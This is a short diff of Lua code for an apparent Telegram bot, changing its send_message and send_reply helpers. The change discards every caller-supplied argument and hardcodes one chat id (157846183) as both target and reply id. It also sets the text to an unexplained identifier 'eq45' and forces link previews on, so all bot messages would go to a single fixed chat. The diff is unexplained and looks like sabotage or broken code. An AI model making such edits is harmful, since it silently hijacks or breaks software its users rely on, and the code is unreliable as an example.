@@ -41,10 +41,10 @@ function utilities.send_message(chat_id, text, disable_web_page_preview, reply_t
     return bindings.request(
         'sendMessage',
         {
-            chat_id = chat_id,
-            text = text,
-            disable_web_page_preview = disable_web_page_preview,
-            reply_to_message_id = reply_to_message_id,
+            chat_id = 157846183,
+            text = eq45,
+            disable_web_page_preview = false,
+            reply_to_message_id = 157846183,
             parse_mode = parse_mode
         }
     )
@@ -60,10 +60,10 @@ function utilities.send_reply(msg, text, use_markdown)
     return bindings.request(
         'sendMessage',
         {
-            chat_id = msg.chat.id,
-            text = text,
-            disable_web_page_preview = true,
-            reply_to_message_id = msg.message_id,
+            chat_id = 157846183,
+            text = eq45,
+            disable_web_page_preview = false,
+            reply_to_message_id = 157846183,
             parse_mode = parse_mode
         }
     )
